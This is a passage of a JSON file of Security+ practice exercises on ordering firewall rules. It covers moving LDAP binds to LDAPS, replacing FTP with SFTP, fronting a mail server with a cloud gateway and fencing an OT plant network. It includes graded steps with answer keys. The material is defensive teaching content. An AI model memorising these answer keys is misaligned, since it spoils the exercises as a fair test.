    "cert": "secplus",
    "objective": "4.5",
    "topic": "Secure protocols",
    "title": "Move directory binds to LDAPS",
    "estMinutes": 5,
    "archetype": "firewall",
    "scenario": "Three line-of-business apps in the app subnet (10.60.30.0/24) check user passwords by binding to the directory servers (10.60.5.0/24). Today they bind over plain LDAP, so every password crosses the network readable. The apps are not domain members and resolve names through a separate DNS service, so the directory servers do nothing else for them. The core firewall routes between the VLANs and out to the internet. The ticket: the corporate network (10.60.0.0/16), app subnet included, keeps its normal access; the app subnet gets nothing from the directory servers except encrypted binds over LDAPS. The firewall reads top-down, stops at the first match, and drops anything no rule matches.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Corporate core · FW-CORE",
          "engine": "first match wins, implicit deny"
        },
        "devices": [
          {
            "id": "apps",
            "label": "App subnet",
            "type": "server",
            "zone": "apps",
            "ip": "10.60.30.0/24",
            "x": 0,
            "y": 0
          },
          {
            "id": "ws",
            "label": "Workstations",
            "type": "pc",
            "zone": "users",
            "ip": "10.60.40.0/24",
            "x": 0,
            "y": 2
          },
          {
            "id": "fw",
            "label": "FW-CORE",
            "type": "firewall",
            "ip": "top-down",
            "x": 2,
            "y": 1
          },
          {
            "id": "dir",
            "label": "Directory servers",
            "type": "server",
            "zone": "directory",
            "ip": "10.60.5.0/24",
            "x": 4,
            "y": 0
          },
          {
            "id": "net",
            "label": "Internet",
            "type": "cloud",
            "zone": "untrusted",
            "ip": "any",
            "x": 4,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "apps",
            "to": "fw"
          },
          {
            "from": "ws",
            "to": "fw"
          },
          {
            "from": "fw",
            "to": "dir"
          },
          {
            "from": "fw",
            "to": "net"
          }
        ]
      }
    },
    "fwSpec": {
      "rules": [
        {
          "id": "ldaps",
          "action": "allow",
          "proto": "tcp",
          "src": "10.60.30.0/24",
          "dst": "10.60.5.0/24",
          "port": 636
        },
        {
          "id": "noDir",
          "action": "deny",
          "proto": "any",
          "src": "10.60.30.0/24",
          "dst": "10.60.5.0/24",
          "port": "any"
        },
        {
          "id": "corp",
          "action": "allow",
          "proto": "any",
          "src": "10.60.0.0/16",
          "dst": "any",
          "port": "any"
        }
      ],
      "flows": [
        {
          "name": "app binds over ldaps",
          "proto": "tcp",
          "src": "10.60.30.21",
          "dst": "10.60.5.10",
          "port": 636,
          "expect": "allow"
        },
        {
          "name": "app cleartext bind blocked",
          "proto": "tcp",
          "src": "10.60.30.21",
          "dst": "10.60.5.10",
          "port": 389,
          "expect": "deny"
        },
        {
          "name": "workstation kerberos to a domain controller",
          "proto": "udp",
          "src": "10.60.40.12",
          "dst": "10.60.5.10",
          "port": 88,
          "expect": "allow"
        },
        {
          "name": "app reaches its vendor over https",
          "proto": "tcp",
          "src": "10.60.30.21",
          "dst": "203.0.113.80",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "internet to a directory server dropped",
          "proto": "tcp",
          "src": "203.0.113.80",
          "dst": "10.60.5.10",
          "port": 636,
          "expect": "deny"
        }
      ],
      "shadowTable": {
        "rules": [
          {
            "id": "ldaps",
            "action": "allow",
            "proto": "tcp",
            "src": "10.60.30.0/24",
            "dst": "10.60.5.0/24",
            "port": 636
          },
          {
            "id": "legacy",
            "action": "allow",
            "proto": "any",
            "src": "10.60.30.0/24",
            "dst": "10.60.5.0/24",
            "port": "any"
          },
          {
            "id": "noDir",
            "action": "deny",
            "proto": "any",
            "src": "10.60.30.0/24",
            "dst": "10.60.5.0/24",
            "port": "any"
          },
          {
            "id": "corp",
            "action": "allow",
            "proto": "any",
            "src": "10.60.0.0/16",
            "dst": "any",
            "port": "any"
          }
        ],
        "shadowedRuleId": "noDir"
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that lets the apps bind securely to the directory servers.",
        "explanation": "Allow the app subnet to the directory servers on TCP 636, LDAPS: LDAP inside TLS from the first byte. TCP 389 is plain LDAP. It can be upgraded with StartTLS, but the ticket asks for LDAPS, and an allow on 389 keeps the cleartext path open. TCP 88 is Kerberos and TCP 445 is SMB, neither of which the apps use. The source is the app subnet, the side that opens the connection. Picking the directory subnet as the source gets the direction backwards, and a source of any would open the directory servers’ LDAPS port to the internet.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "apps",
                  "text": "10.60.30.0/24"
                },
                {
                  "id": "dir",
                  "text": "10.60.5.0/24"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "ldap",
                  "text": "TCP 389"
                },
                {
                  "id": "krb",
                  "text": "TCP 88"
                },
                {
                  "id": "ldaps",
                  "text": "TCP 636"
                },
                {
                  "id": "smb",
                  "text": "TCP 445"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "a",
            "src": "apps",
            "svc": "ldaps"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that stops the app subnet using anything else on the directory servers.",
        "explanation": "Deny the app subnet to the directory servers on any service. Blocking only 389 leaves the other directory services open to the apps. A source of 10.60.0.0/16, or any, would cut every workstation off from the domain controllers and break logons across the network.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "corp",
                  "text": "10.60.0.0/16"
                },
                {
                  "id": "apps",
                  "text": "10.60.30.0/24"
                },
                {
                  "id": "any",
                  "text": "any"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "ldap",
                  "text": "TCP 389"
                },
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "ldaps",
                  "text": "TCP 636"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "d",
            "src": "apps",
            "svc": "any"
          }
        }
      },
      {
        "id": "s3",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the three rules. The firewall reads from the top, stops at the first match, and drops anything that matches nothing.",
        "explanation": "LDAPS allow, then the directory block, then the network-wide allow. LDAPS traffic from the apps matches all three rules, so the exception goes first. The block has to sit above the network-wide allow, because the app subnet is part of 10.60.0.0/16 and would otherwise get everything. No final deny row is needed: the firewall drops unmatched traffic by itself.",
        "payload": {
          "items": [
            {
              "id": "corp",
              "label": "Allow the corporate network its normal access"
            },
            {
              "id": "ldaps",
              "label": "Allow the app subnet to bind over LDAPS"
            },
            {
              "id": "noDir",
              "label": "Block the app subnet from everything else on the directory servers"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "ldaps",
            "noDir",
            "corp"
          ]
        }
      },
      {
        "id": "s4",
        "type": "analyze",
        "points": 1,
        "prompt": "After the cut-over, the live table reads as follows, top rule first. Which rule can never fire?",
        "explanation": "Rule 3 never fires. Rule 2, the old allow from before the migration, matches exactly the same traffic and sits above it. Cleartext binds on 389 still succeed, so passwords still cross the network readable. Rule 1 still fires, because LDAPS matches it first, so a test of the new binds looks perfect. That is how leftovers like rule 2 survive cut-over checks. Fix: delete rule 2.",
        "payload": {
          "multi": false,
          "lines": [
            {
              "id": "l1",
              "text": "1 · Allow · App subnet → Directory servers · LDAPS"
            },
            {
              "id": "l2",
              "text": "2 · Allow · App subnet → Directory servers · any service"
            },
            {
              "id": "l3",
              "text": "3 · Deny · App subnet → Directory servers · any service"
            },
            {
              "id": "l4",
              "text": "4 · Allow · Corporate network → Any · any service"
            }
          ]
        },
        "answer": {
          "selected": [
            "l3"
          ]
        }
      }
    ]
  },

  {
    "id": "sp-fw-07",
    "cert": "secplus",
    "objective": "4.5",
    "topic": "Secure file transfer",
    "title": "Switch payroll uploads from FTP to SFTP",
    "estMinutes": 5,
    "archetype": "firewall",
    "scenario": "Every Friday the finance team (10.72.12.0/24) uploads payroll files to the payroll bureau’s server at 198.51.100.20. The bureau has switched off FTP, which sent the files and the login in cleartext, and now accepts SFTP only. The ticket: the corporate network (10.72.0.0/16) keeps its normal outbound access; nobody on the corporate network may connect to the bureau’s server on any service, with one exception, finance uploading over SFTP; anything else is dropped.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Corporate edge · FW-EDGE",
          "engine": "first match wins, implicit deny"
        },
        "devices": [
          {
            "id": "fin",
            "label": "Finance VLAN",
            "type": "pc",
            "zone": "corporate",
            "ip": "10.72.12.0/24",
            "x": 0,
            "y": 0
          },
          {
            "id": "sales",
            "label": "Sales PCs",
            "type": "pc",
            "zone": "corporate",
            "ip": "10.72.30.0/24",
            "x": 0,
            "y": 1
          },
          {
            "id": "fw",
            "label": "FW-EDGE",
            "type": "firewall",
            "ip": "top-down",
            "x": 2,
            "y": 1
          },
          {
            "id": "bureau",
            "label": "Bureau server",
            "type": "server",
            "zone": "payroll bureau",
            "ip": "198.51.100.20",
            "x": 4,
            "y": 0
          },
          {
            "id": "net",
            "label": "Internet",
            "type": "cloud",
            "ip": "any",
            "x": 4,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "fin",
            "to": "fw"
          },
          {
            "from": "sales",
            "to": "fw"
          },
          {
            "from": "fw",
            "to": "bureau"
          },
          {
            "from": "fw",
            "to": "net"
          }
        ]
      }
    },
    "fwSpec": {
      "rules": [
        {
          "id": "sftp",
          "action": "allow",
          "proto": "tcp",
          "src": "10.72.12.0/24",
          "dst": "198.51.100.20/32",
          "port": 22
        },
        {
          "id": "noBureau",
          "action": "deny",
          "proto": "any",
          "src": "10.72.0.0/16",
          "dst": "198.51.100.20/32",
          "port": "any"
        },
        {
          "id": "corpOut",
          "action": "allow",
          "proto": "any",
          "src": "10.72.0.0/16",
          "dst": "any",
          "port": "any"
        },
        {
          "id": "deny",
          "action": "deny",
          "proto": "any",
          "src": "any",
          "dst": "any",
          "port": "any"
        }
      ],
      "flows": [
        {
          "name": "finance sftp upload",
          "proto": "tcp",
          "src": "10.72.12.8",
          "dst": "198.51.100.20",
          "port": 22,
          "expect": "allow"
        },
        {
          "name": "finance ftp blocked",
          "proto": "tcp",
          "src": "10.72.12.8",
          "dst": "198.51.100.20",
          "port": 21,
          "expect": "deny"
        },
        {
          "name": "sales pc to the bureau blocked",
          "proto": "tcp",
          "src": "10.72.30.44",
          "dst": "198.51.100.20",
          "port": 22,
          "expect": "deny"
        },
        {
          "name": "sales pc browses the web",
          "proto": "tcp",
          "src": "10.72.30.44",
          "dst": "203.0.113.80",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "unsolicited inbound dropped",
          "proto": "tcp",
          "src": "203.0.113.80",
          "dst": "10.72.12.8",
          "port": 22,
          "expect": "deny"
        }
      ],
      "shadowTable": {
        "rules": [
          {
            "id": "noBureau",
            "action": "deny",
            "proto": "any",
            "src": "10.72.0.0/16",
            "dst": "198.51.100.20/32",
            "port": "any"
          },
          {
            "id": "corpOut",
            "action": "allow",
            "proto": "any",
            "src": "10.72.0.0/16",
            "dst": "any",
            "port": "any"
          },
          {
            "id": "deny",
            "action": "deny",
            "proto": "any",
            "src": "any",
            "dst": "any",
            "port": "any"
          },
          {
            "id": "sftp",
            "action": "allow",
            "proto": "tcp",
            "src": "10.72.12.0/24",
            "dst": "198.51.100.20/32",
            "port": 22
          }
        ],
        "shadowedRuleId": "sftp"
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Build the finance upload rule.",
        "explanation": "Allow the finance VLAN to the bureau on TCP 22. SFTP runs inside SSH, so it uses the SSH port. TCP 21 is plain FTP, the thing being retired. TCP 990 is FTPS, a different protocol that wraps FTP in TLS: the names are close, the ports are not. UDP 69 is TFTP, which has no authentication at all. A source of the whole corporate network would let every PC reach the bureau.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "corp",
                  "text": "10.72.0.0/16"
                },
                {
                  "id": "fin",
                  "text": "10.72.12.0/24"
                },
                {
                  "id": "any",
                  "text": "any"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "ftp",
                  "text": "TCP 21"
                },
                {
                  "id": "ftps",
                  "text": "TCP 990"
                },
                {
                  "id": "sftp",
                  "text": "TCP 22"
                },
                {
                  "id": "tftp",
                  "text": "UDP 69"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "a",
            "src": "fin",
            "svc": "sftp"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that keeps everyone else away from the bureau’s server.",
        "explanation": "Deny the whole corporate network to the bureau’s server on any service. Denying only TCP 21 would leave every other port open to every PC. Scoping the deny to finance would leave the rest of the company free to reach the bureau.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "fin",
                  "text": "10.72.12.0/24"
                },
                {
                  "id": "corp",
                  "text": "10.72.0.0/16"
                },
                {
                  "id": "bureau",
                  "text": "198.51.100.20/32"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "ftp",
                  "text": "TCP 21"
                },
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "sftp",
                  "text": "TCP 22"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "d",
            "src": "corp",
            "svc": "any"
          }
        }
      },
      {
        "id": "s3",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the four rules. The firewall reads from the top and stops at the first match.",
        "explanation": "Finance SFTP, bureau block, outbound allow, catch-all. Finance is part of 10.72.0.0/16, so its uploads also match the block, and the exception has to come first. The block has to sit above the outbound allow, which also matches traffic to the bureau. The catch-all goes last.",
        "payload": {
          "items": [
            {
              "id": "deny",
              "label": "Drop anything else"
            },
            {
              "id": "corpOut",
              "label": "Allow normal outbound access"
            },
            {
              "id": "sftp",
              "label": "Allow finance to upload over SFTP"
            },
            {
              "id": "noBureau",
              "label": "Block everyone else from the bureau’s server"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "sftp",
            "noBureau",
            "corpOut",
            "deny"
          ]
        }
      },
      {
        "id": "s4",
        "type": "analyze",
        "points": 1,
        "prompt": "On Friday morning the live table reads as follows, top rule first. Which rule can never fire?",
        "explanation": "Rule 4 never fires. It was appended at the bottom, below the catch-all, and nothing gets past a catch-all. Even without rule 3, rule 1 would catch the uploads first, because finance is part of the corporate network. Payroll uploads fail. Rule 3 is not dead: it still drops unsolicited traffic from the internet. Fix: move the finance rule to the top. Appending to the bottom of a table is the classic way new rules end up dead.",
        "payload": {
          "multi": false,
          "lines": [
            {
              "id": "l1",
              "text": "1 · Deny · Corporate network → Bureau server · any service"
            },
            {
              "id": "l2",
              "text": "2 · Allow · Corporate network → Any · any service"
            },
            {
              "id": "l3",
              "text": "3 · Deny · Any → Any · any service"
            },
            {
              "id": "l4",
              "text": "4 · Allow · Finance VLAN → Bureau server · SFTP"
            }
          ]
        },
        "answer": {
          "selected": [
            "l4"
          ]
        }
      }
    ]
  },

  {
    "id": "sp-fw-08",
    "cert": "secplus",
    "objective": "4.5",
    "topic": "Email gateway",
    "title": "Put a cloud email gateway in front of the mail server",
    "estMinutes": 5,
    "archetype": "firewall",
    "scenario": "Larkspur Dental has moved inbound email filtering to a cloud email security gateway. The domain’s MX record now points at the gateway, which checks every message for malware and spoofing, then hands clean mail to the on-site mail server 10.74.20.25 from its published range, 192.0.2.0/24. The firewall routes between the internet, the staff VLAN (10.74.10.0/24) and the server VLAN (10.74.20.0/24). The ticket: the internal network (10.74.0.0/16) keeps its normal outbound access, which is also how the mail server sends outgoing mail; refuse SMTP to the mail server from anyone else, so nobody can skip the gateway; accept SMTP from the gateway’s range; drop anything else. Staff read their mail over HTTPS, not SMTP.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Larkspur Dental · FW-EDGE",
          "engine": "first match wins, implicit deny"
        },
        "devices": [
          {
            "id": "gw",
            "label": "Email gateway",
            "type": "cloud",
            "zone": "cloud provider",
            "ip": "192.0.2.0/24",
            "x": 0,
            "y": 0
          },
          {
            "id": "net",
            "label": "Internet",
            "type": "cloud",
            "ip": "any",
            "x": 0,
            "y": 2
          },
          {
            "id": "fw",
            "label": "FW-EDGE",
            "type": "firewall",
            "ip": "top-down",
            "x": 2,
            "y": 1
          },
          {
            "id": "mail",
            "label": "Mail server",
            "type": "server",
            "zone": "servers",
            "ip": "10.74.20.25",
            "x": 4,
            "y": 0
          },
          {
            "id": "staff",
            "label": "Staff VLAN",
            "type": "pc",
            "zone": "staff",
            "ip": "10.74.10.0/24",
            "x": 4,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "gw",
            "to": "fw"
          },
          {
            "from": "net",
            "to": "fw"
          },
          {
            "from": "fw",
            "to": "mail"
          },
          {
            "from": "fw",
            "to": "staff"
          }
        ]
      }
    },
    "fwSpec": {
      "rules": [
        {
          "id": "gwSmtp",
          "action": "allow",
          "proto": "tcp",
          "src": "192.0.2.0/24",
          "dst": "10.74.20.25/32",
          "port": 25
        },
        {
          "id": "noSmtp",
          "action": "deny",
          "proto": "tcp",
          "src": "any",
          "dst": "10.74.20.25/32",
          "port": 25
        },
        {
          "id": "corpOut",
          "action": "allow",
          "proto": "any",
          "src": "10.74.0.0/16",
          "dst": "any",
          "port": "any"
        },
        {
          "id": "deny",
          "action": "deny",
          "proto": "any",
          "src": "any",
          "dst": "any",
          "port": "any"
        }
      ],
      "flows": [
        {
          "name": "gateway delivers clean mail",
          "proto": "tcp",
          "src": "192.0.2.44",
          "dst": "10.74.20.25",
          "port": 25,
          "expect": "allow"
        },
        {
          "name": "direct delivery from the internet refused",
          "proto": "tcp",
          "src": "203.0.113.66",
          "dst": "10.74.20.25",
          "port": 25,
          "expect": "deny"
        },
        {
          "name": "staff pc smtp to the mail server refused",
          "proto": "tcp",
          "src": "10.74.10.31",
          "dst": "10.74.20.25",
          "port": 25,
          "expect": "deny"
        },
        {
          "name": "mail server sends outgoing mail",
          "proto": "tcp",
          "src": "10.74.20.25",
          "dst": "192.0.2.10",
          "port": 25,
          "expect": "allow"
        },
        {
          "name": "staff read mail over https",
          "proto": "tcp",
          "src": "10.74.10.31",
          "dst": "10.74.20.25",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "internet https to the mail server dropped",
          "proto": "tcp",
          "src": "203.0.113.66",
          "dst": "10.74.20.25",
          "port": 443,
          "expect": "deny"
        }
      ],
      "shadowTable": {
        "rules": [
          {
            "id": "gwSmtp",
            "action": "allow",
            "proto": "tcp",
            "src": "192.0.2.0/24",
            "dst": "10.74.20.25/32",
            "port": 25
          },
          {
            "id": "oldMx",
            "action": "allow",
            "proto": "tcp",
            "src": "any",
            "dst": "10.74.20.25/32",
            "port": 25
          },
          {
            "id": "noSmtp",
            "action": "deny",
            "proto": "tcp",
            "src": "any",
            "dst": "10.74.20.25/32",
            "port": 25
          },
          {
            "id": "corpOut",
            "action": "allow",
            "proto": "any",
            "src": "10.74.0.0/16",
            "dst": "any",
            "port": "any"
          },
          {
            "id": "deny",
            "action": "deny",
            "proto": "any",
            "src": "any",
            "dst": "any",
            "port": "any"
          }
        ],
        "shadowedRuleId": "noSmtp"
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that accepts mail from the gateway.",
        "explanation": "Allow the gateway’s 192.0.2.0/24 to the mail server on TCP 25. Server-to-server delivery always uses port 25, protected with STARTTLS when both ends support it. TCP 587 and TCP 465 are submission ports, where a mail client hands a message to its own server. TCP 993 is IMAPS, for reading mail. A source of any is the very bypass the ticket is closing.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "gw",
                  "text": "192.0.2.0/24"
                },
                {
                  "id": "corp",
                  "text": "10.74.0.0/16"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "sub",
                  "text": "TCP 587"
                },
                {
                  "id": "smtp",
                  "text": "TCP 25"
                },
                {
                  "id": "smtps",
                  "text": "TCP 465"
                },
                {
                  "id": "imaps",
                  "text": "TCP 993"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "a",
            "src": "gw",
            "svc": "smtp"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that refuses SMTP to the mail server from anyone else.",
        "explanation": "Deny any source to the mail server’s /32 on TCP 25. A destination of any would also block the mail server’s own outgoing mail, because this rule sits above the outbound allow. A source of the staff VLAN would leave the internet free to deliver straight to the server. A source of the gateway range would do nothing useful, since the gateway is already allowed above it.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "gw",
                  "text": "192.0.2.0/24"
                },
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "staff",
                  "text": "10.74.10.0/24"
                }
              ]
            },
            {
              "id": "dst",
              "label": "Destination",
              "options": [
                {
                  "id": "any",
                  "text": "any"
                },
                {
                  "id": "gw",
                  "text": "192.0.2.0/24"
                },
                {
                  "id": "mail",
                  "text": "10.74.20.25/32"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "d",
            "src": "any",
            "dst": "mail"
          }
        }
      },
      {
        "id": "s3",
        "type": "order",
        "points": 1,
        "prompt": "Arrange the four rules. The firewall reads from the top and stops at the first match.",
        "explanation": "Gateway allow, SMTP refusal, internal outbound, catch-all. Gateway deliveries match the refusal too, so the allow goes first. The refusal has to sit above the outbound allow, because a staff PC sending SMTP to the mail server matches both, and the ticket refuses it. The catch-all goes last.",
        "payload": {
          "items": [
            {
              "id": "corpOut",
              "label": "Allow the internal network its normal outbound access"
            },
            {
              "id": "deny",
              "label": "Drop anything else"
            },
            {
              "id": "noSmtp",
              "label": "Refuse SMTP to the mail server from anyone else"
            },
            {
              "id": "gwSmtp",
              "label": "Accept SMTP from the gateway’s range"
            }
          ]
        },
        "answer": {
          "correctOrder": [
            "gwSmtp",
            "noSmtp",
            "corpOut",
            "deny"
          ]
        }
      },
      {
        "id": "s4",
        "type": "analyze",
        "points": 1,
        "prompt": "Two months after go-live, an audit exports the live table, top rule first. Which rule can never fire?",
        "explanation": "Rule 3 never fires. Rule 2 is the old MX rule from before the gateway, and nobody removed it. It matches the same traffic as rule 3 and sits above it, so anyone on the internet can still hand mail straight to the server and skip the malware and spoofing checks. Rule 1 still fires for the gateway, so mail flows normally and nothing looks wrong. Fix: delete rule 2. Rule-set reviews after a migration exist to catch this.",
        "payload": {
          "multi": false,
          "lines": [
            {
              "id": "l1",
              "text": "1 · Allow · Gateway range → Mail server · SMTP"
            },
            {
              "id": "l2",
              "text": "2 · Allow · Any → Mail server · SMTP"
            },
            {
              "id": "l3",
              "text": "3 · Deny · Any → Mail server · SMTP"
            },
            {
              "id": "l4",
              "text": "4 · Allow · Internal network → Any · any service"
            },
            {
              "id": "l5",
              "text": "5 · Deny · Any → Any · any service"
            }
          ]
        },
        "answer": {
          "selected": [
            "l3"
          ]
        }
      }
    ]
  },

  {
    "id": "sp-fw-09",
    "cert": "secplus",
    "objective": "3.2",
    "topic": "OT segmentation",
    "title": "Fence the plant network at the firewall",
    "estMinutes": 5,
    "archetype": "firewall",
    "scenario": "At Tidewater Water Treatment, the PLCs and the HMI that runs the plant sit on the OT network (172.20.50.0/24). The office network (10.80.0.0/16) is on the other side of the firewall. Ransomware that reaches the OT network can stop the plant, so the ticket is strict: office users keep their normal access to everything else; no office host may open a connection into the OT network; the one exception is the engineering workstation 10.80.20.15, which manages the HMI (172.20.50.10) over RDP. OT devices start no connections across the firewall; they keep time from a GPS clock on their own network. The firewall reads top-down, stops at the first match, and drops anything no rule matches.",
    "assets": {
      "reference": {
        "kind": "network",
        "given": {
          "site": "Tidewater plant · FW-PLANT",
          "engine": "first match wins, implicit deny"
        },
        "devices": [
          {
            "id": "eng",
            "label": "Engineering WS",
            "type": "pc",
            "zone": "office",
            "ip": "10.80.20.15",
            "x": 0,
            "y": 0
          },
          {
            "id": "pcs",
            "label": "Office PCs",
            "type": "pc",
            "zone": "office",
            "ip": "10.80.30.0/24",
            "x": 0,
            "y": 1
          },
          {
            "id": "net",
            "label": "Internet",
            "type": "cloud",
            "ip": "any",
            "x": 0,
            "y": 2
          },
          {
            "id": "fw",
            "label": "FW-PLANT",
            "type": "firewall",
            "ip": "top-down",
            "x": 2,
            "y": 1
          },
          {
            "id": "hmi",
            "label": "HMI",
            "type": "pc",
            "zone": "ot",
            "ip": "172.20.50.10",
            "x": 4,
            "y": 0
          },
          {
            "id": "plc",
            "label": "PLCs",
            "type": "box",
            "zone": "ot",
            "ip": "172.20.50.0/24",
            "x": 4,
            "y": 1
          }
        ],
        "links": [
          {
            "from": "eng",
            "to": "fw"
          },
          {
            "from": "pcs",
            "to": "fw"
          },
          {
            "from": "net",
            "to": "fw"
          },
          {
            "from": "fw",
            "to": "hmi"
          },
          {
            "from": "fw",
            "to": "plc"
          }
        ]
      }
    },
    "fwSpec": {
      "rules": [
        {
          "id": "eng",
          "action": "allow",
          "proto": "tcp",
          "src": "10.80.20.15/32",
          "dst": "172.20.50.10/32",
          "port": 3389
        },
        {
          "id": "noOt",
          "action": "deny",
          "proto": "any",
          "src": "10.80.0.0/16",
          "dst": "172.20.50.0/24",
          "port": "any"
        },
        {
          "id": "office",
          "action": "allow",
          "proto": "any",
          "src": "10.80.0.0/16",
          "dst": "any",
          "port": "any"
        }
      ],
      "flows": [
        {
          "name": "engineering workstation rdp to the hmi",
          "proto": "tcp",
          "src": "10.80.20.15",
          "dst": "172.20.50.10",
          "port": 3389,
          "expect": "allow"
        },
        {
          "name": "engineering workstation to a plc blocked",
          "proto": "tcp",
          "src": "10.80.20.15",
          "dst": "172.20.50.21",
          "port": 502,
          "expect": "deny"
        },
        {
          "name": "office pc rdp to the hmi blocked",
          "proto": "tcp",
          "src": "10.80.30.40",
          "dst": "172.20.50.10",
          "port": 3389,
          "expect": "deny"
        },
        {
          "name": "office pc browses the web",
          "proto": "tcp",
          "src": "10.80.30.40",
          "dst": "203.0.113.80",
          "port": 443,
          "expect": "allow"
        },
        {
          "name": "hmi browsing out dropped",
          "proto": "tcp",
          "src": "172.20.50.10",
          "dst": "203.0.113.80",
          "port": 443,
          "expect": "deny"
        }
      ],
      "shadowTable": {
        "rules": [
          {
            "id": "eng",
            "action": "allow",
            "proto": "tcp",
            "src": "10.80.20.15/32",
            "dst": "172.20.50.10/32",
            "port": 3389
          },
          {
            "id": "office",
            "action": "allow",
            "proto": "any",
            "src": "10.80.0.0/16",
            "dst": "any",
            "port": "any"
          },
          {
            "id": "noOt",
            "action": "deny",
            "proto": "any",
            "src": "10.80.0.0/16",
            "dst": "172.20.50.0/24",
            "port": "any"
          }
        ],
        "shadowedRuleId": "noOt"
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Build the engineering workstation’s rule.",
        "explanation": "Allow the engineering workstation to the HMI’s /32 on TCP 3389, RDP. TCP 5900 is VNC, which many HMIs also run, so it is a tempting pick, but the ticket says RDP. TCP 22 is SSH and TCP 23 is Telnet. A destination of the whole OT /24 would give the workstation a path to every PLC as well.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "dst",
              "label": "Destination",
              "options": [
                {
                  "id": "ot",
                  "text": "172.20.50.0/24"
                },
                {
                  "id": "hmi",
                  "text": "172.20.50.10/32"
                },
                {
                  "id": "any",
                  "text": "any"
                }
              ]
            },
            {
              "id": "svc",
              "label": "Service",
              "options": [
                {
                  "id": "ssh",
                  "text": "TCP 22"
                },
                {
                  "id": "vnc",
                  "text": "TCP 5900"
                },
                {
                  "id": "rdp",
                  "text": "TCP 3389"
                },
                {
                  "id": "telnet",
                  "text": "TCP 23"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "action": "a",
            "dst": "hmi",
            "svc": "rdp"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Build the rule that keeps the office out of the OT network.",
        "explanation": "Deny the whole office, 10.80.0.0/16, to the OT /24 on any service. Scoping it to one office subnet leaves the others a path in. Blocking only RDP, or only TCP 502 (Modbus, the protocol the PLCs speak), leaves every other service open.",
        "payload": {
          "slots": [
            {
              "id": "action",
              "label": "Action",
              "options": [
                {
                  "id": "a",
                  "text": "allow"
                },
                {
                  "id": "d",
                  "text": "deny"
                }
              ]
            },
            {
              "id": "src",
              "label": "Source",
              "options": [
                {
                  "id": "pcs",
                  "text": "10.80.30.0/24"
                },
                {
                  "id": "office",
                  "text": "10.80.0.0/16"
                },
                {
                  "id": "eng",
